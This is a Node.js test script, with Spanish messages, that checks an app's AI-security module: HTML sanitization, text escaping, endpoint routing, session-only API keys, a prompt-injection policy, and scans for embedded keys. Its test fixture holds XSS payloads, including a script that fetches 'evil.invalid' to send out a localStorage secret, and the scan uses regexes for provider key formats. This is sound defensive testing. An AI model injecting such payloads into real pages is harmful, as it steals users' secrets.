const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const root = path.resolve(process.argv[2] || path.join(__dirname, '..'));
const securitySource = fs.readFileSync(path.join(root, 'modules', 'ai-security.js'), 'utf8');
const routerSource = fs.readFileSync(path.join(root, 'modules', 'ai-router.js'), 'utf8');
const initSource = fs.readFileSync(path.join(root, 'modules', 'init.js'), 'utf8');
const appSource = fs.readFileSync(path.join(root, 'app.html'), 'utf8');
const moduleFiles = fs.readdirSync(path.join(root, 'modules')).filter(name => name.endsWith('.js'));

const context = { window: {}, console, encodeURIComponent };
context.globalThis = context;
vm.createContext(context);
vm.runInContext(securitySource, context, { filename: 'modules/ai-security.js' });

const dirty = `<p onclick="steal()">Hola <strong>equipo</strong><img src=x onerror="steal()"></p>
  <script>fetch('https://evil.invalid/?k='+localStorage.secret)</script>
  <a href="javascript:steal()">mal</a><a href="https://example.invalid">bien</a>`;
const clean = context.window.VoltflowAISecurity.sanitizeHTML(dirty);
assert(!/script|onerror|onclick|javascript:/i.test(clean), 'El HTML generado conserva una ruta ejecutable');
assert(/<strong>equipo<\/strong>/i.test(clean), 'El sanitizador elimino formato permitido');
assert(/https:\/\/example\.invalid/i.test(clean), 'El sanitizador elimino un enlace https permitido');

const escaped = context.window.VoltflowAISecurity.escapeText(`<img src=x onerror=alert(1)>`);
assert(!escaped.includes('<img'), 'El escape de texto permite etiquetas');
assert(escaped.includes('&lt;img'), 'El escape de texto no conserva el contenido visible');

for (const name of moduleFiles.filter(name => name !== 'ai-router.js')) {
  const source = fs.readFileSync(path.join(root, 'modules', name), 'utf8');
  assert(!source.includes('generativelanguage.googleapis.com'), `${name} contiene endpoint Gemini directo`);
  assert(!source.includes('api.groq.com/openai'), `${name} contiene endpoint Groq directo`);
  assert(!source.includes('openrouter.ai/api'), `${name} contiene endpoint OpenRouter directo`);
}
assert(!/generateContent\?key=/.test(routerSource), 'La clave Gemini aparece en la URL');
assert(/['"]x-goog-api-key['"]/.test(routerSource), 'Gemini no usa una cabecera para la clave');
assert(/POLITICA DE SEGURIDAD:[\s\S]{0,300}contenido no confiable/.test(routerSource), 'Falta defensa central contra prompt injection');
assert(/sanitizeAIHTML\(result\.body/.test(routerSource), 'La respuesta de email no se sanitiza');
assert(/sessionStorage\.setItem\('gordi_gemini_key'/.test(initSource), 'Las claves nuevas de Gemini no son de sesion');
assert(!/localStorage\.setItem\('gordi_gemini_key',\s*k\)/.test(initSource), 'Gemini nuevo persiste su clave en localStorage');
assert(appSource.indexOf('modules/ai-security.js') < appSource.indexOf('modules/ai-email.js'), 'La seguridad IA se carga demasiado tarde');

const secretPatterns = [
  /AIza[0-9A-Za-z_-]{24,}/,
  /gsk_[0-9A-Za-z]{20,}/,
  /sk-or-[0-9A-Za-z_-]{20,}/,
];
for (const relative of ['app.html', 'index.html', 'version.json', ...moduleFiles.map(name => `modules/${name}`)]) {
  const source = fs.readFileSync(path.join(root, relative), 'utf8');
  secretPatterns.forEach(pattern => assert(!pattern.test(source), `Posible secreto incrustado en ${relative}`));
}

console.log('AI security PASS: HTML sanitization, prompt isolation, session keys and endpoint ownership');
